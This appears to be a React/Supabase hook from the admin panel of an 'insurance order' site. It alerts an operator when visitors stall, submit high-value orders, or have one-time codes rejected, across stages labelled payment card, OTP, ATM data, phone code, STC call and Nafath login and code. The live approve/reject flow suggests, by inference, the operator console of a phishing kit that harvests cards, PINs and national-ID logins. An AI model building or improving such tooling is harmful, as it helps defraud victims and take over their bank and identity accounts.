import { useEffect, useRef, useCallback } from "react";
import { supabase } from "@/integrations/supabase/client";
import { sounds } from "@/lib/sounds";

export interface SmartAlert {
  id: string;
  icon: string;
  title: string;
  description: string;
  severity: "info" | "warning" | "critical";
  type: "stuck" | "multi_fail" | "suspicious_speed" | "high_value" | "returning_visitor";
  visitorId?: string;
  time: Date;
}

interface StageEvent {
  id: string;
  order_id: string;
  stage: string;
  status: string;
  stage_entered_at: string;
  visitor_session_id: string | null;
  payload: any;
}

interface Order {
  id: string;
  current_stage: string | null;
  stage_status: string | null;
  total_price: number | null;
  visitor_session_id: string | null;
  customer_name: string | null;
  updated_at: string;
}

const STUCK_THRESHOLD_SEC = 120; // 2 min stuck on same stage
const FAST_THRESHOLD_SEC = 3; // suspiciously fast stage completion
const HIGH_VALUE_THRESHOLD = 5000; // high value order

export function useSmartAlerts(onAlert: (alert: SmartAlert) => void) {
  const alertedRef = useRef<Set<string>>(new Set());
  const intervalRef = useRef<ReturnType<typeof setInterval>>();

  const createAlert = useCallback((alert: Omit<SmartAlert, "id" | "time">) => {
    const key = `${alert.type}-${alert.visitorId || ""}-${alert.title}`;
    if (alertedRef.current.has(key)) return;
    alertedRef.current.add(key);
    // Auto-clear after 5 min to allow re-alerting
    setTimeout(() => alertedRef.current.delete(key), 5 * 60 * 1000);

    const newAlert: SmartAlert = {
      ...alert,
      id: crypto.randomUUID(),
      time: new Date(),
    };
    onAlert(newAlert);

    // Play alert sound based on severity
    const muteAll = localStorage.getItem("admin_feed_mute") === "true";
    if (!muteAll) {
      if (alert.severity === "critical") sounds.urgentReminder?.();
      else if (alert.severity === "warning") sounds.feedAction?.();
      else sounds.feedNavigation?.();
    }
  }, [onAlert]);

  // Periodic check for stuck visitors and suspicious patterns
  const runChecks = useCallback(async () => {
    try {
      const { data: orders } = await supabase
        .from("insurance_orders")
        .select("id, current_stage, stage_status, total_price, visitor_session_id, customer_name, updated_at")
        .eq("stage_status", "pending")
        .not("current_stage", "is", null);

      if (!orders) return;

      const now = Date.now();

      for (const order of orders as Order[]) {
        const updatedAt = new Date(order.updated_at).getTime();
        const stuckSecs = Math.floor((now - updatedAt) / 1000);
        const name = order.customer_name || `طلب #${order.id.slice(0, 6)}`;

        // Stuck on stage for too long
        if (stuckSecs > STUCK_THRESHOLD_SEC) {
          const mins = Math.floor(stuckSecs / 60);
          createAlert({
            icon: "⏰",
            title: `زائر عالق: ${name}`,
            description: `عالق في مرحلة "${stageAr(order.current_stage)}" منذ ${mins} دقيقة`,
            severity: stuckSecs > 300 ? "critical" : "warning",
            type: "stuck",
            visitorId: order.visitor_session_id || undefined,
          });
        }

        // High value order pending
        if (order.total_price && order.total_price >= HIGH_VALUE_THRESHOLD) {
          createAlert({
            icon: "💰",
            title: `طلب عالي القيمة: ${name}`,
            description: `قيمة الطلب ${order.total_price} ر.س - في مرحلة "${stageAr(order.current_stage)}"`,
            severity: "warning",
            type: "high_value",
            visitorId: order.visitor_session_id || undefined,
          });
        }
      }

      // Check for multiple failed OTP attempts
      const fiveMinAgo = new Date(now - 5 * 60 * 1000).toISOString();
      const { data: recentEvents } = await supabase
        .from("insurance_order_stage_events")
        .select("order_id, stage, status, visitor_session_id, stage_entered_at")
        .eq("status", "rejected")
        .gte("stage_entered_at", fiveMinAgo);

      if (recentEvents) {
        // Group by visitor+stage
        const failGroups: Record<string, StageEvent[]> = {};
        for (const ev of recentEvents as StageEvent[]) {
          const key = `${ev.visitor_session_id}-${ev.stage}`;
          if (!failGroups[key]) failGroups[key] = [];
          failGroups[key].push(ev);
        }

        for (const [key, events] of Object.entries(failGroups)) {
          if (events.length >= 2) {
            const sessionId = events[0].visitor_session_id;
            createAlert({
              icon: "🚨",
              title: `محاولات فاشلة متعددة`,
              description: `${events.length} محاولات مرفوضة في "${stageAr(events[0].stage)}" خلال 5 دقائق`,
              severity: "critical",
              type: "multi_fail",
              visitorId: sessionId || undefined,
            });
          }
        }
      }

      // Check for suspiciously fast stage completions
      const { data: fastEvents } = await supabase
        .from("insurance_order_stage_events")
        .select("order_id, stage, status, visitor_session_id, stage_entered_at, payload")
        .eq("status", "approved")
        .gte("stage_entered_at", fiveMinAgo);

      if (fastEvents) {
        for (const ev of fastEvents as StageEvent[]) {
          const duration = (ev.payload as any)?.duration_seconds;
          if (duration !== undefined && duration < FAST_THRESHOLD_SEC) {
            createAlert({
              icon: "⚡",
              title: `إتمام سريع مشبوه`,
              description: `مرحلة "${stageAr(ev.stage)}" أُكملت في ${duration} ثانية فقط`,
              severity: "warning",
              type: "suspicious_speed",
              visitorId: ev.visitor_session_id || undefined,
            });
          }
        }
      }

    } catch (err) {
      console.error("Smart alerts check failed:", err);
    }
  }, [createAlert]);

  useEffect(() => {
    // Run immediately then every 15 seconds
    runChecks();
    intervalRef.current = setInterval(runChecks, 15000);
    return () => {
      if (intervalRef.current) clearInterval(intervalRef.current);
    };
  }, [runChecks]);

  // Real-time: listen for new stage events
  useEffect(() => {
    const channel = supabase
      .channel("smart-alerts-realtime")
      .on("postgres_changes", {
        event: "INSERT",
        schema: "public",
        table: "insurance_order_stage_events",
      }, (payload) => {
        const ev = payload.new as StageEvent;
        // Immediate alert for new pending events
        if (ev.status === "pending") {
          createAlert({
            icon: "🔔",
            title: `مرحلة جديدة بانتظار الرد`,
            description: `"${stageAr(ev.stage)}" تحتاج اتخاذ إجراء`,
            severity: "info",
            type: "stuck",
            visitorId: ev.visitor_session_id || undefined,
          });
        }
      })
      .subscribe();

    return () => { supabase.removeChannel(channel); };
  }, [createAlert]);
}

function stageAr(stage: string | null): string {
  const map: Record<string, string> = {
    payment: "بطاقة الدفع",
    otp: "كود OTP",
    atm: "بيانات ATM",
    phone_verification: "توثيق الجوال",
    phone_otp: "كود الجوال",
    stc_call: "مكالمة STC",
    nafath_login: "دخول النفاذ",
    nafath_verify: "رمز النفاذ",
  };
  return map[stage || ""] || stage || "غير محدد";
}
